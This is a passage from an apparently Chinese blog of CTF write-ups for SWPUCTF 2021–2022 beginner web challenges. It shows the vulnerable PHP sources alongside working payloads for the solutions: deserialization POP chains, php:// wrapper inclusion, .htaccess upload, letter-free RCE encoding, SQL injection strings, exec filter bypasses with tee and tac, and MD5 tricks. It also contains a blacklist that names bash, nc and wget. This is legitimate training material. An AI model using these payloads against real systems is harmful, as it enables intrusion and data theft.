class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">"No wake up"</span>;<br>            }<br>        }<br>    }<br><br><span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'p'</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br>}<br><span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HaHaHa</span>();<br><span class="hljs-variable">$pop</span>-&gt;admin = <span class="hljs-string">'admin'</span>;<br><span class="hljs-variable">$pop</span>-&gt;passwd = <span class="hljs-string">'wllm'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">O:<span class="hljs-number">6</span>:<span class="hljs-string">"HaHaHa"</span>:<span class="hljs-number">6</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"admin"</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"admin"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"passwd"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"wllm"</span>;}<span class="hljs-comment">//修改属性个数即可</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303190723699.png" alt="image-20240303190723699"></p>
<h1>[SWPUCTF 2021 新生赛]PseudoProtocols</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303191538892.png" alt="image-20240303191538892"></p>
<p>看了提示才想到伪协议</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"max_execution_time"</span>, <span class="hljs-string">"180"</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);<br><span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"a"</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">'r'</span>)) === <span class="hljs-string">'I want flag'</span>){<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"success\n"</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303192415788.png" alt="image-20240303192415788"></p>
<p>看到这种<code>file_get_contents</code>的用法，就是php://input，当然data协议也可</p>
<h1>[SWPUCTF 2021 新生赛]easyupload3.0</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303192838844.png" alt="image-20240303192838844"></p>
<p>可以看到允许htaccess上传</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303192914464.png" alt="image-20240303192914464"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303193005353.png" alt="image-20240303193005353"></p>
<h1>[SWPUCTF 2021 新生赛]hardrce</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Type:text/html;charset=utf-8"</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wllm'</span>]))<br>{<br>    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wllm'</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">' '</span>,<span class="hljs-string">'\t'</span>,<span class="hljs-string">'\r'</span>,<span class="hljs-string">'\n'</span>,<span class="hljs-string">'\+'</span>,<span class="hljs-string">'\['</span>,<span class="hljs-string">'\^'</span>,<span class="hljs-string">'\]'</span>,<span class="hljs-string">'\"'</span>,<span class="hljs-string">'\-'</span>,<span class="hljs-string">'\$'</span>,<span class="hljs-string">'\*'</span>,<span class="hljs-string">'\?'</span>,<span class="hljs-string">'\&lt;'</span>,<span class="hljs-string">'\&gt;'</span>,<span class="hljs-string">'\='</span>,<span class="hljs-string">'\`'</span>,];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)<br>    {<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/'</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">'/m'</span>, <span class="hljs-variable">$wllm</span>)) {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"LTLT说不能用这些奇奇怪怪的符号哦！"</span>);<br>    }}<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/[a-zA-Z]/is'</span>,<span class="hljs-variable">$wllm</span>))<br>{<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Ra's Al Ghul说不能用字母哦！"</span>);<br>}<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"NoVic4说：不错哦小伙子，可你能拿到flag吗？"</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);<br>}<br><span class="hljs-keyword">else</span><br>{<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"蔡总说：注意审题！！！"</span>;<br>}<br><span class="hljs-meta">?&gt;</span> 蔡总说：注意审题！！！<br></code></pre></td></tr></tbody></table></figure>
<p>可以看到字母和大部分符号都过滤了，只能无字母RCE。可参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a></p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">'[+]your function: '</span>);<br><br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">"\r\n"</span>, <span class="hljs-string">"\r"</span>, <span class="hljs-string">"\n"</span>), <span class="hljs-string">""</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">'[+]your command: '</span>);<br><br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">"\r\n"</span>, <span class="hljs-string">"\r"</span>, <span class="hljs-string">"\n"</span>), <span class="hljs-string">""</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">'[*] (~'</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">')(~'</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">');'</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303194201575.png" alt="image-20240303194201575"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303194218237.png" alt="image-20240303194218237"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303194242292.png" alt="image-20240303194242292"></p>
<h1>[SWPUCTF 2021 新生赛]error</h1>
<p>简单的报错注入</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">?id=<span class="hljs-number">1</span>' and <span class="hljs-built_in">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,substr((select flag from test_tb),<span class="hljs-number">15</span>,<span class="hljs-number">30</span>)),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303195140537.png" alt="image-20240303195140537"></p>
<h1>[SWPUCTF 2021 新生赛]pop</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">"index.php"</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>{<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">'aaa'</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">'123456'</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">'w44m'</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">'08067'</span>){<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">'nono'</span>;<br>        }<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;{<span class="hljs-variable language_">$this</span>-&gt;w22m}();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    }<br>}<br><br><span class="hljs-variable">$w00m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'w00m'</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$w00m</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>{<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">'w44m'</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">'08067'</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>}<br><span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$pop</span>-&gt;w00m = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$pop</span>-&gt;w00m-&gt;w00m = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$pop</span>-&gt;w00m-&gt;w22m = <span class="hljs-string">'Getflag'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303200129685.png" alt="image-20240303200129685"></p>
<p>注意不可见字符的处理即可</p>
<h1>[SWPUCTF 2021 新生赛]sql</h1>
<p>这道题过滤了几个关键字</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">空格用<span class="hljs-comment">/**/</span>代替<br>=用like代替<br>--+中的+用%<span class="hljs-number">23</span>代替<br>substr用mid代替<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">wllm=-<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">mid</span>((concat(flag)),<span class="hljs-number">25</span>,<span class="hljs-number">35</span>),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>LTLT_flag%<span class="hljs-number">23</span><br></code></pre></td></tr></tbody></table></figure>
<h1>[SWPUCTF 2021 新生赛]finalrce</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>]))<br>{<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\&gt;|\&lt;|\%|\$/i'</span>,<span class="hljs-variable">$url</span>))<br>    {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Sorry,you can't use this."</span>;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Can you see anything?"</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$url</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>由于exec函数，那么是无回显的，这里可以用tee命令将内容重定向到文件，随后查看文件即可</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">l\s /|tee <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303203715901.png" alt="image-20240303203715901"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204310579.png" alt="image-20240303204310579"></p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">?url=tac /flllll\aaaaaaggggggg |tee <span class="hljs-number">3</span><span class="hljs-selector-class">.txt</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204338590.png" alt="image-20240303204338590"></p>
<h1>[SWPUCTF 2022 新生赛]ez_ez_php</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])) {<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>], <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) === <span class="hljs-string">"php"</span> ) {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Nice!!!"</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>]);<br>    } <br><br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker!!"</span>;<br>    }<br>}<span class="hljs-keyword">else</span> {<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br><span class="hljs-comment">//flag.php</span><br></code></pre></td></tr></tbody></table></figure>
<p>根据代码，很明显要求我们用PHP伪协议（这么明显？？）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204811480.png" alt="image-20240303204811480"></p>
<p>然后提示flag在flag文件中</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204821994.png" alt="image-20240303204821994"></p>
<h1>[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])) {<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>], <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) === <span class="hljs-string">"php"</span> ) {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Nice!!!"</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>]);<br>    } <br><br>    <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker!!"</span>;<br>    }<br>}<span class="hljs-keyword">else</span> {<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br><span class="hljs-comment">//flag.php</span><br></code></pre></td></tr></tbody></table></figure>
<p>不理解，一模一样，只不过flag换地方了。。。？？？？</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303205018625.png" alt="image-20240303205018625"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303205030022.png" alt="image-20240303205030022"></p>
<h1>[SWPUCTF 2022 新生赛]奇妙的MD5</h1>
<p>这道题听脑洞，不会-》看wp</p>
<p>首先是信息搜集，发现http头有提示</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303210123025.png" alt="image-20240303210123025"></p>
<p>也就是说大概率传一个字符，经过<code>md5($pass, true)</code>处理之后与前面的SQL语句拼接之后恒为true</p>
<p>这里我想不出来，看了wp发现有两种可能</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">一个算是万能绕过的字符：ffifdyop，根据函数md5加密后，再次转换为字符串时，会变成’or’<span class="hljs-number">6</span>，此时函数一定为真。（具体内容可以查一查<span class="hljs-built_in">md5</span>($pass,true)函数）<br><br>一个是 MD5 加密后弱比较等于自身，这个字符串是 <span class="hljs-number">0</span>e215962017 <br></code></pre></td></tr></tbody></table></figure>
<p><code>md5($pass, true)</code> 的含义是对 <code>$pass</code> 进行 MD5 哈希计算，其中第二个参数为 <code>true</code>，表示返回二进制结果，而不是十六进制字符串。通常情况下，MD5 哈希函数返回的是一个32个字符的十六进制字符串表示的哈希值，但如果传入 <code>true</code> 参数，则返回一个16字节的二进制字符串。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303210303084.png" alt="image-20240303210303084"></p>
<p>输入上述的字符串ffifdyop之后，到了第二个页面，找到部分源码</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;!--<br><span class="hljs-variable">$x</span>= <span class="hljs-variable">$GET</span><span class="hljs-selector-attr">[<span class="hljs-string">'x'</span>]</span>;<br><span class="hljs-variable">$y</span> = $_GET<span class="hljs-selector-attr">[<span class="hljs-string">'y'</span>]</span>;<br><span class="hljs-built_in">if</span>($x != $y &amp;&amp; md5($x) == <span class="hljs-built_in">md5</span>($y)){<br>    ;<br>-&gt;<br></code></pre></td></tr></tbody></table></figure>
<p>数组绕过，之后到第三个页面，依旧是数组绕过</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'wqh'</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'dsy'</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'wqh'</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'dsy'</span>])){<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$FLAG</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303210521940.png" alt="image-20240303210521940"></p>
<h1>[SWPUCTF 2022 新生赛]1z_unserialize</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lyh</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$url</span> = <span class="hljs-string">'NSSCTF.com'</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lly</span>;<br>     <br>     <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">     </span>{<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;lt;<br><br>        <span class="hljs-variable">$a</span>(<span class="hljs-variable language_">$this</span>-&gt;lly);<br>   